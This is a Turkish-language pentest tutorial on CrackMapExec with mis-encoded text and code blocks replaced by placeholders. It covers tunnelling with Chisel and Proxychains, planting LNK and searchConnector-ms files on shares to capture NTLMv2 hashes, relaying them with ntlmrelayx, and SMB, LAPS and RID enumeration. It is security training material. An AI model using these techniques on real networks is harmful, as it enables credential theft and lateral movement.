CrackMapExec, aÄŸ gÃ¼venliÄŸi testlerinde ve sÄ±zma testlerinde kullanÄ±cÄ±larÄ±n iÅŸini kolaylaÅŸtÄ±ran, etkili bir araÃ§tÄ±r. GeniÅŸ protokol desteÄŸi, hÄ±zlÄ± keÅŸif, gÃ¼venlik aÃ§Ä±klarÄ± tespiti ve yÃ¶netimsel haklar elde etme gibi Ã§eÅŸitli Ã¶zellikleriyle gÃ¼venlik profesyonellerinin vazgeÃ§ilmez araÃ§larÄ± arasÄ±nda yer alÄ±r. Bu araÃ§, aÄŸ yapÄ±larÄ±nÄ±n daha gÃ¼venli hale getirilmesi iÃ§in Ã¶nemli bir rol oynar ve her gÃ¼venlik uzmanÄ±nÄ±n repertuarÄ±nda bulunmasÄ± gereken bir araÃ§tÄ±r.


, 'print

Dizine gidebilir ve kullanÄ±cÄ±nÄ±n eriÅŸebileceÄŸi tÃ¼m dosyalarÄ±n bir listesini alabiliriz:


### KullanÄ±cÄ±nÄ±n KullanabileceÄŸi DosyalarÄ± Listeleme

{{CODE_BLOCK_94}}

EÄŸer paylaÅŸÄ±mÄ±n tÃ¼m iÃ§eriÄŸini indirmek istiyorsak `READ_ONLY=false` seÃ§eneÄŸini aÅŸaÄŸÄ±daki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: SabÄ±rlÄ± olmamÄ±z gerekiyor. PaylaÅŸÄ±lan klasÃ¶r ve dosya sayÄ±sÄ±na baÄŸlÄ± olarak iÅŸlem birkaÃ§ dakika sÃ¼rebilir

`spider_plus` modÃ¼lÃ¼ iÃ§in mevcut tÃ¼m seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `--options` seÃ§eneÄŸini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir `proxy` aracÄ±lÄ±ÄŸÄ±yla diÄŸer aÄŸlara ulaÅŸmak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± anlatÄ±lacaktÄ±r.


---


### Proxychains with CME

### Scenario

Ä°nternal bir Pentest Ã¼zerinde Ã§alÄ±ÅŸÄ±yoruz. Bir aÄŸ taramasÄ± gerÃ§ekleÅŸtirdik ve yalnÄ±zca bir host (10.129.204.133) tespit edip ele geÃ§irebildik. Ele geÃ§irilen bu host Ã¼zerinde `ipconfig` Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, iki aÄŸ baÄŸdaÅŸtÄ±rÄ±cÄ±sÄ± olduÄŸunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip baÅŸka bir hostu gÃ¶steriyor. TopladÄ±ÄŸÄ±mÄ±z bilgilere dayanarak aÅŸaÄŸÄ±daki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu aÄŸdaki (172.16.1.0/24) herhangi bir makineye saldÄ±rmak iÃ§in, saldÄ±rÄ± hostumuz ile MS01 arasÄ±nda bir `tÃ¼nel` kurmalÄ±yÄ±z. Bu nedenle, CME tarafÄ±ndan yÃ¼rÃ¼tÃ¼len tÃ¼m komutlar MS01 Ã¼zerinden geÃ§er.


### Set Up the Tunnel

TÃ¼nelimizi kurmak iÃ§in [Chisel](https://github.com/jpillora/chisel) kullanacaÄŸÄ±z. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldÄ±racaÄŸÄ±mÄ±z makinemiz iÃ§in en son Windows binary'sini ve saldÄ±rÄ± hostumuzda kullanmak iÃ§in en yeni Linux binary'sini indirelim ve aÅŸaÄŸÄ±daki adÄ±mlarÄ± gerÃ§ekleÅŸtirelim:

*  Chisel'Ä± SaldÄ±rÄ± Hostumuza indirin ve Ã‡alÄ±ÅŸtÄ±rÄ±n:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u Ä°ndirin ve Hedef Host'a YÃ¼kleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yÃ¼rÃ¼tme seÃ§eneÄŸi `-x`'i kullanarak Chisel sunucumuza baÄŸlanmak iÃ§in `chisel.exe` dosyasÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±n (Bu seÃ§eneÄŸi Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha fazla tartÄ±ÅŸacaÄŸÄ±z)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar Ã§alÄ±ÅŸmaya devam edecektir. Bunu bu bÃ¶lÃ¼mde daha sonra yapacaÄŸÄ±z.

**Attack host** Ã¼zerinde, **Chisel server** Ã§Ä±ktÄ±sÄ±nda **bir client baÄŸlantÄ±sÄ± aldÄ±ÄŸÄ±mÄ±zÄ± ve tÃ¼neli baÅŸlattÄ±ÄŸÄ±mÄ±zÄ±** gÃ¶steren yeni bir satÄ±r gÃ¶rmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediÄŸini kontrol ederek de tÃ¼nelin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± doÄŸrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayÄ±lan portu `TCP 1080`'i kullanacak ÅŸekilde yapÄ±landÄ±rmamÄ±z gerekir. YapÄ±landÄ±rma dosyasÄ±nÄ±n ProxyList bÃ¶lÃ¼mÃ¼ne `socks5 127.0.0.1 1080`'i aÅŸaÄŸÄ±daki gibi eklediÄŸimizden emin olmamÄ±z gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* ArtÄ±k 172.16.1.10 IP'sine ulaÅŸmak iÃ§in `Proxychains` aracÄ±lÄ±ÄŸÄ±yla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains Ã§Ä±ktÄ±sÄ±nÄ± konsoldan kaldÄ±rmak iÃ§in `Proxychains4` ve `quiet -q` seÃ§eneÄŸini kullanabiliriz:

### Quiet SeÃ§eneÄŸi ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracÄ±lÄ±ÄŸÄ±yla herhangi bir CME iÅŸlemi gerÃ§ekleÅŸtirebiliriz.


### Killing Chisel on the Target Machine

Ä°ÅŸimiz bittiÄŸinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak iÃ§in, PowerShell komutlarÄ±nÄ± yÃ¼rÃ¼tmek iÃ§in `-X` seÃ§eneÄŸini kullanacaÄŸÄ±z ve PowerShell komutunu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z `Stop-Process - Name chisel -Force .` Komut yÃ¼rÃ¼tme konusunu Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptÄ±ktan sonra, Chisel client komutunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±z terminal aÅŸaÄŸÄ±daki gibi sonuÃ§lanmalÄ±dÄ±r:


### Chisel'i Zorla Durdurduktan Sonra Terminalin KapanmasÄ±

{{CODE_BLOCK_107}}

ArtÄ±k saldÄ±rÄ± konaÄŸÄ±mÄ±zdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Ãœzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak baÅŸlatarak ve saldÄ±rÄ± hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak baÅŸlatmak iÃ§in `server --socks5` seÃ§eneÄŸini kullanacaÄŸÄ±z.


### Chisel'i Hedef Makinede Sunucu Olarak BaÅŸlatma

{{CODE_BLOCK_109}}

Åimdi hedef makinemiz Chisel sunucusuna baÄŸlanmak ve proxy'yi etkinleÅŸtirmek iÃ§in IP ve porttan sonra `socks` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_110}}

Åimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e BaÄŸlanmak iÃ§in Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bÃ¶lÃ¼mde, **attack host** Ã¼zerinde **Proxychains** ve **Chisel** yapÄ±landÄ±rmayÄ± ve **CrackMapExec** kullanarak hedef makinede **Chisel** Ã§alÄ±ÅŸtÄ±rmayÄ± Ã¶ÄŸrendik.

Ä°lerleyen bÃ¶lÃ¼mlerde, diÄŸer aÄŸlara ulaÅŸmak iÃ§in `CrackMapExec` ve `Proxychains` kullanacaÄŸÄ±z.

---

### Stealing Hashes

Yeni hesaplarÄ± ele geÃ§irmek iÃ§in kullanÄ±lan en yaygÄ±n tekniklerden biri parola hashlerinin Ã§alÄ±nmasÄ±dÄ±r. Bunu baÅŸarmanÄ±n farklÄ± yÃ¶ntemleri vardÄ±r, ancak yaygÄ±n olanÄ±, bir bilgisayarÄ± veya kullanÄ±cÄ±yÄ± kontrol ettiÄŸimiz sahte bir paylaÅŸÄ±lan klasÃ¶rle bir kimlik doÄŸrulama iÅŸlemi baÅŸlatmaya zorlamaktÄ±r.

Bu kimlik doÄŸrulama iÅŸlemini baÅŸlatÄ±rken, kullanÄ±cÄ± veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araÃ§ kullanÄ±larak kÄ±rÄ±labilir veya kimlik bilgilerini bilmeden kullanÄ±cÄ±nÄ±n kimliÄŸine bÃ¼rÃ¼nmek iÃ§in baÅŸka bir bilgisayara iletilebilir.

PaylaÅŸÄ±lan klasÃ¶rleri kullanarak hash'leri Ã§almak iÃ§in bir kÄ±sayol oluÅŸturabilir ve kÄ±sayolda gÃ¶rÃ¼nen simge sahte paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼zÃ¼ gÃ¶sterecek ÅŸekilde yapÄ±landÄ±rabiliriz. KullanÄ±cÄ± paylaÅŸÄ±lan klasÃ¶re girdiÄŸinde, simgenin konumunu aramaya Ã§alÄ±ÅŸacak ve paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼ze karÅŸÄ± kimlik doÄŸrulamasÄ±nÄ± zorlayacaktÄ±r.

NTLMv2 hash'lerini toplama hakkÄ±nda daha fazla bilgi edinmek iÃ§in RedTeam Ekipler iÃ§in [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadÄ±](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kÄ±sayollarÄ±n kullanÄ±mÄ±nÄ± deÄŸil, aynÄ± amaca hizmet eden diÄŸer dosya tÃ¼rlerini de gÃ¶sterir.


### Slinky ModÃ¼lÃ¼

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafÄ±ndan oluÅŸturulan bir modÃ¼ldÃ¼r ve CME'deki en heyecan verici modÃ¼llerden biridir. Prensip basittir. ModÃ¼l, yazma izinlerine sahip tÃ¼m paylaÅŸÄ±mlarda belirtilen SMB sunucusuna bir UNC yolu iÃ§eren simge attribute'a sahip Windows kÄ±sayollarÄ± oluÅŸturur. Birisi paylaÅŸÄ±mÄ± ziyaret ettiÄŸinde, simge attribute'u sunucumuza giden bir UNC yolu iÃ§erdiÄŸi iÃ§in `Responder` kullanarak NTLMv2 hash'ini alacaÄŸÄ±z.

ModÃ¼lÃ¼n `SERVER` ve `NAME` olmak Ã¼zere iki zorunlu seÃ§eneÄŸi ve bir isteÄŸe baÄŸlÄ± `CLEANUP` seÃ§eneÄŸi vardÄ±r.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiÄŸimiz SMB sunucusunun IP'sine ve UNC yolunun iÅŸaret etmesini istediÄŸimiz yere karÅŸÄ±lÄ±k gelir. `NAME` seÃ§eneÄŸi kÄ±sayol dosyasÄ±na bir isim atar, `CLEANUP` ise iÅŸimiz bittiÄŸinde kÄ±sayolu silmek iÃ§indir.


### Chisel kullanarak baÄŸlama

Bu alÄ±ÅŸtÄ±rma iÃ§in lokal eriÅŸimi simÃ¼le edeceÄŸiz ve internal aÄŸa baÄŸlanmak iÃ§in Chisel ve Proxychains kullanacaÄŸÄ±z. Chisel zaten hedef makinemizde bir sunucu olarak Ã§alÄ±ÅŸÄ±yor ve bir client olarak baÄŸlanmamÄ±z ve daha sonra internal aÄŸÄ± numaralandÄ±rmak iÃ§in proxychains kullanmamÄ±z gerekiyor. Chisel kullanarak baÄŸlanmak iÃ§in aÅŸaÄŸÄ±daki komutu **kullanalÄ±m**


### Hedef Makine Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Ã‡alÄ±nmasÄ±
Ä°lk olarak, `--shares` seÃ§eneÄŸini kullanarak `grace` kullanÄ±cÄ±sÄ±nÄ±n `WRITE` ayrÄ±calÄ±klarÄ±na sahip olduÄŸu bir paylaÅŸÄ±m bulalÄ±m:

### WRITE AyrÄ±calÄ±klarÄ±na Sahip PaylaÅŸÄ±mlarÄ± Bulma

{{CODE_BLOCK_114}}


GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `grace` `HR` ve `IT-Tools` paylaÅŸÄ±mlarÄ±na yazabilir. Bu nedenle her bir paylaÅŸÄ±ma bir `LNK` dosyasÄ± yazmak iÃ§in `Slinky` modÃ¼lÃ¼nÃ¼ kullanabiliriz. 

**SERVER=10.10.14.33** seÃ§eneÄŸini kullanarak **attack host**'umuzun **tun0** aÄŸÄ±ndaki **IP adresini** belirteceÄŸiz ve **NAME=important** seÃ§eneÄŸiyle **LNK dosyasÄ±na atanacak dosya adÄ±nÄ±** belirleyeceÄŸiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` aÃ§Ä±sÄ±ndan gÃ¼venli** olarak kabul edilir Ã§Ã¼nkÃ¼ tÃ¼m iÅŸlemler ya **`bellekte` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r**, ya **`WinAPI` Ã§aÄŸrÄ±larÄ±yla aÄŸ Ã¼zerinden sorgulanÄ±r**, ya da **Windows'un built-in araÃ§larÄ±/Ã¶zellikleri** kullanÄ±larak gerÃ§ekleÅŸtirilir.

Bu gereksinimleri karÅŸÄ±lamayan bir modÃ¼l Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±mÄ±zda, **Ã¶nceden bir uyarÄ± alÄ±rÄ±z**. **`Slinky`** modÃ¼lÃ¼, **OpSec aÃ§Ä±sÄ±ndan gÃ¼venli olmayan** bir modÃ¼le Ã¶rnektir. Devam etmeden Ã¶nce **bir uyarÄ± alacaÄŸÄ±z**.

LNK dosyasÄ± oluÅŸturulduktan sonra, Responder'Ä± Ã§alÄ±ÅŸtÄ±rmamÄ±z ve birinin paylaÅŸÄ±ma gÃ¶z atmasÄ±nÄ± beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak iÃ§in `Responder.conf` dosyasÄ±nda SMB seÃ§eneÄŸi `On` olmalÄ±dÄ±r.

NTLMv2 hash'imizi aldÄ±k ve hesabÄ± kullanmak iÃ§in onu kÄ±rmamÄ±z gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kÄ±rmak iÃ§in, `ASREPRoast` ve `Kerberoasting` ile yaptÄ±ÄŸÄ±mÄ±z gibi `Hashcat mod 5600`'Ã¼ kullanabiliriz. `NTLM Relay`'e odaklanalÄ±m.


### **NTLM Relay**

DiÄŸer bir Ã§Ã¶zÃ¼m ise NTLMv2 hash'ini doÄŸrudan `SMB Sign`'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± aÄŸdaki diÄŸer sunuculara ve workstation'lara iletmektir. SMB Sign Ã§ok Ã¶nemlidir Ã§Ã¼nkÃ¼ bir bilgisayarda SMB Sign etkinse, saldÄ±rÄ± hostumuzun kimliÄŸini kanÄ±tlayamayacaÄŸÄ±mÄ±z iÃ§in o bilgisayara relay yapamayÄ±z. SMB Sign'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± hedeflerin bir listesini almak iÃ§in `--gen-relay-list` seÃ§eneÄŸini kullanabiliriz.

Åimdi Proxychains'i kullanabilir ve SMB Sign devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracÄ±nÄ±, daha Ã¶nce **`--gen-relay-list`** seÃ§eneÄŸiyle elde ettiÄŸimiz listeyle birlikte kullanacaÄŸÄ±z.

Hedef makinede **local administrator** ayrÄ±calÄ±klarÄ±na sahip bir hesap bulursak ve ek seÃ§enekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanÄ±cÄ±sÄ±nÄ±n hash'leriyle** bir **`pass-the-hash attack`** gerÃ§ekleÅŸtirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanÄ±cÄ±nÄ±n **SMB share**'ine eriÅŸmesini beklemeliyiz. **LNK dosyamÄ±z**, kullanÄ±cÄ±nÄ±n hedef makinemize baÄŸlanmasÄ±nÄ± zorlar (**bu iÅŸlem arka planda gerÃ§ekleÅŸir ve kullanÄ±cÄ± herhangi bir anormallik fark etmez**).

Bu gerÃ§ekleÅŸtiÄŸinde, **`ntlmrelayx`** konsolunda aÅŸaÄŸÄ±dakine benzer bir Ã§Ä±ktÄ± gÃ¶rmeliyiz:

{{CODE_BLOCK_119}}

ArdÄ±ndan, administrator hash'ini kullanarak hedef makinede kimlik doÄŸrulamasÄ± yapmak iÃ§in crackmapexec'i kullanabiliriz:

### Local HesaplarÄ± Test Etme

{{CODE_BLOCK_120}}

### Her Åeyi Temizleyin

ModÃ¼lÃ¼ kullandÄ±ktan sonra, **LNK dosyasÄ±nÄ± temizlemek** iÃ§in **`-o CLEANUP=YES`** seÃ§eneÄŸini ve **LNK dosyasÄ±nÄ±n adÄ±nÄ±** (**`NAME=important`**) belirtmek kritik Ã¶nem taÅŸÄ±r.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc ModÃ¼lÃ¼ ile Hash'lerin Ã‡alÄ±nmasÄ±

Bu bÃ¶lÃ¼mÃ¼ tamamlamadan Ã¶nce, **LNK** dÄ±ÅŸÄ±nda baÅŸka bir dosya formatÄ± kullanarak kimlik doÄŸrulamasÄ±nÄ± zorlamanÄ±n baÅŸka bir yÃ¶ntemine bakalÄ±m: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatlarÄ±. Bu dosya formatlarÄ±nÄ±n Ã§oÄŸu Windows sÃ¼rÃ¼mÃ¼nde **varsayÄ±lan dosya iliÅŸkilendirmeleri** bulunur. Windows ile entegre Ã§alÄ±ÅŸarak iÃ§eriÄŸi rastgele bir konumdan, hatta **`WebDAV` paylaÅŸÄ±mÄ±yla belirtilen remote bir konumdan** gÃ¶sterebilirler.

Ã–zetle, bu dosyalar **LNK** dosyasÄ±yla aynÄ± iÅŸlevi gÃ¶rÃ¼r. Bu yÃ¶ntemin keÅŸfi hakkÄ±nda daha fazla bilgi edinmek iÃ§in **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** baÅŸlÄ±klÄ± blog yazÄ±sÄ±nÄ± okuyabiliriz.

CrackMapExec, **`drop-sc`** adÄ±nda bir modÃ¼le sahiptir. Bu modÃ¼l, paylaÅŸÄ±lan bir klasÃ¶rde **`searchConnector-ms`** dosyasÄ± oluÅŸturmamÄ±za olanak tanÄ±r. Kullanabilmek iÃ§in **URL** seÃ§eneÄŸini belirterek **SMB fake sunucumuzu** hedef gÃ¶stermemiz gerekir. Bu durumda, **`ntlmrelayx`** Ã§alÄ±ÅŸtÄ±ran hostumuz olacaktÄ±r. **URL** deÄŸeri Ã§ift ters eÄŸik Ã§izgi (`\`) ile kaÃ§Ä±rÄ±lmalÄ±dÄ±r. Ã–rneÄŸin: **`URL=\\10.10.14.33\secret`**.

Ä°steÄŸe baÄŸlÄ± olarak aÅŸaÄŸÄ±daki seÃ§enekleri belirleyebiliriz:

* `SHARE=name` seÃ§eneÄŸi ile hedef paylaÅŸÄ±mlÄ± klasÃ¶r . Bu seÃ§eneÄŸi belirtmezsek, dosyayÄ± `WRITE` izinlerine sahip tÃ¼m paylaÅŸÄ±mlara yazacaktÄ±r

* `FILENAME=name` seÃ§eneÄŸi ile dosya adÄ± . Bu seÃ§eneÄŸi belirtmezsek, â€œ`Documents`â€ adÄ±nda bir dosya oluÅŸturacaktÄ±r.

* OluÅŸturduÄŸumuz dosyalarÄ± temizlemek istiyorsak `CLEANUP=True` seÃ§eneÄŸi. EÄŸer Ã¶zel bir isim kullanacaksak filename seÃ§eneÄŸini belirtmemiz gerekiyor.

Drop-sc'yi iÅŸ baÅŸÄ±nda gÃ¶relim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanÄ±cÄ± **paylaÅŸÄ±lan klasÃ¶re** eriÅŸtiÄŸinde ve **ntlmrelayx** dinleme modunda Ã§alÄ±ÅŸÄ±rken, kimlik bilgilerini **hedef makineye yÃ¶nlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak YÃ¶nlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seÃ§eneÄŸi ile `.searchConnector-ms` dosyasÄ±nÄ± temizleyebiliriz:


### searchConnector-ms DosyalarÄ±nÄ± Temizleme

{{CODE_BLOCK_125}}


LNK dosyalarÄ± genellikle bu tÃ¼r saldÄ±rÄ±lar iÃ§in bilinir. `.searchConnector-ms` gibi baÅŸka bir dosya tÃ¼rÃ¼ kullanmak, fark edilmemenize yardÄ±mcÄ± olabilir.

Sonraki bÃ¶lÃ¼mlerde CrackMapExec'in keÅŸif seÃ§eneklerini inceleyeceÄŸiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geÃ§erli bir domain kullanÄ±cÄ± hesabÄ±yla numaralandÄ±rma sÃ¶z konusu olduÄŸunda Ã§ok daha fazla seÃ§enekle birlikte gelir. En Ã§ok kullanÄ±lan seÃ§enekleri ele aldÄ±k, ancak daha derine inelim. Ä°ÅŸte ayrÄ±calÄ±klÄ± olmasa bile geÃ§erli bir hesap aldÄ±ÄŸÄ±mÄ±zda kullanabileceÄŸimiz tÃ¼m seÃ§eneklerin listesi:

| Komut                                                                 | AÃ§Ä±klama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --loggedon-users` | Hedefte oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± listeler.                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --sessions`       | Hedefteki aktif oturumlarÄ± listeler.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --computers`      | Hedef aÄŸdaki bilgisayarlarÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi`            | Belirtilen WMI sorgusunu Ã§alÄ±ÅŸtÄ±rÄ±r.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi-namespace`  | WMI Namespaceâ€™ini belirtir (varsayÄ±lan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --rid-brute`      | Hedef Ã¼zerinde RID brute-force yÃ¶ntemiyle kullanÄ±cÄ±larÄ± listeler. |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --local-groups`   | Local gruplarÄ± listeler; grup belirtilirse Ã¼yelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --shares`         | Hedefteki tÃ¼m paylaÅŸÄ±m izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`          | Hedefteki domain kullanÄ±cÄ±larÄ±nÄ± listeler.                        |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`         | Hedefteki domain gruplarÄ±nÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --pass-pol`       | Domainin password policy'sini gÃ¶sterir.                           |

Daha Ã¶nce Ã§alÄ±ÅŸmamÄ±ÅŸ olanlarÄ± gÃ¶zden geÃ§irelim:

### Hedefteki aktif oturumlarÄ± / oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± numaralandÄ±rma

Birden fazla hedefi ele geÃ§irmiÅŸsek, aktif oturumlarÄ± kontrol etmek faydalÄ± olabilir, belki bir domain administrator vardÄ±r ve bu belirli hedefe odaklanmamÄ±z gerekebilir. Bir bilgisayardaki kullanÄ±cÄ±larÄ± tespit etmek iÃ§in `--sessions` ve `--loggedon-users` seÃ§eneklerini kullanabiliriz. Session'lar, kullanÄ±cÄ±nÄ±n hedef makinede giriÅŸ yapmÄ±yor olsa da kullanÄ±cÄ± kimlik bilgileriyle oturum aÃ§Ä±ldÄ±ÄŸÄ± anlamÄ±na gelir. GiriÅŸ yapmÄ±ÅŸ kullanÄ±cÄ±lar ise kendiliÄŸinden anlaÅŸÄ±lÄ±r; bir kullanÄ±cÄ±nÄ±n hedef makineye giriÅŸ yapmÄ±ÅŸ olduÄŸunu ifade eder. `BloodHound`, aktif oturumlarÄ± bulmak iÃ§in kullanabileceÄŸimiz bir diÄŸer araÃ§tÄ±r.


### Sessions ve loggendon-users seÃ§eneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanÄ±cÄ±yÄ± arÄ±yorsak, -`-loggedon-users-filter` seÃ§eneÄŸini ve ardÄ±ndan aradÄ±ÄŸÄ±mÄ±z kullanÄ±cÄ±nÄ±n adÄ±nÄ± kullanabiliriz. Birden fazla kullanÄ±cÄ± arÄ±yorsak, `regex`'i de destekler.


### Oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larla filtre seÃ§eneÄŸini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin baÅŸarÄ±lÄ± bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rÄ±labilmesi iÃ§in administrator izinleri gereklidir.



### Enumerate Computers

CME ayrÄ±ca domain bilgisayarlarÄ±nÄ± da listeleyebilir ve bunu bir LDAP isteÄŸi gerÃ§ekleÅŸtirerek yapar

### Domain'deki BilgisayarlarÄ± NumaralandÄ±rma

{{CODE_BLOCK_128}}


Not: Bu seÃ§enek yalnÄ±zca SMB protokolÃ¼nde mevcut olsa da, CME bir LDAP sorgusu yapmaktadÄ±r.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e baÄŸlÄ± bilgisayarlarÄ±n local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca uygun kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya sÄ±fÄ±rlama talebinde bulunabilir. LAPS domain iÃ§inde kullanÄ±lÄ±yorsa ve LAPS ÅŸifrelerini okuyabilen bir hesabÄ± tehlikeye atarsak, `--laps` seÃ§eneÄŸini bir hedef listesi ile kullanabilir ve komutlarÄ± Ã§alÄ±ÅŸtÄ±rabilir veya `--sam` gibi diÄŸer seÃ§enekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: EÄŸer varsayÄ±lan administrator hesap adÄ± "`administrator`" deÄŸilse, -`-laps username` seÃ§eneÄŸinden sonra kullanÄ±cÄ± adÄ±nÄ± ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak KullanÄ±cÄ±larÄ± NumaralandÄ±r --rid-brute

Nadiren kullanÄ±lan bir Ã¶zellik, kullanÄ±cÄ± listeleri oluÅŸturmak iÃ§in `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanÄ±cÄ± listesi oluÅŸturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktÄ±r. CrackMapExec'in `--rid-brute` seÃ§eneÄŸini kullanarak, UserID'sini brute forcing yaparak bir kullanÄ±cÄ± listesi toplamak mÃ¼mkÃ¼ndÃ¼r.


### List Local Users

{{CODE_BLOCK_130}}

VarsayÄ±lan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandÄ±rÄ±r. DavranÄ±ÅŸÄ±nÄ± `--rid-brute [MAX_RID]` kullanarak deÄŸiÅŸtirebiliriz.

